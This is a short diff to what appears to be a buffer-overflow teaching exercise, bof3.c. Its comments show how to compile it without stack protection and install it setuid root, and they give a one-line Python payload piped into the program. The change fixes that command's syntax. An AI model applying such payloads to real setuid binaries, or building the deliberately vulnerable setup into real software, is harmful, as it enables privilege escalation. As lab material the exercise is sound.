@@ -8,7 +8,7 @@
 // COMPILE $ gcc -fno-stack-protector bof3.c -o bof3
 // SETUID  $ sudo chown root:root bof3
 //         $ sudo chmod 4755 bof3
-// EXPLOIT $ {python -c "print('a\x00\x00\x00'*36";cat} | ./bof3
+// EXPLOIT $ (python -c "print 'a\x00\x00\x00'*36";cat) | ./bof3
 
 void vuln() {
     int innocent;
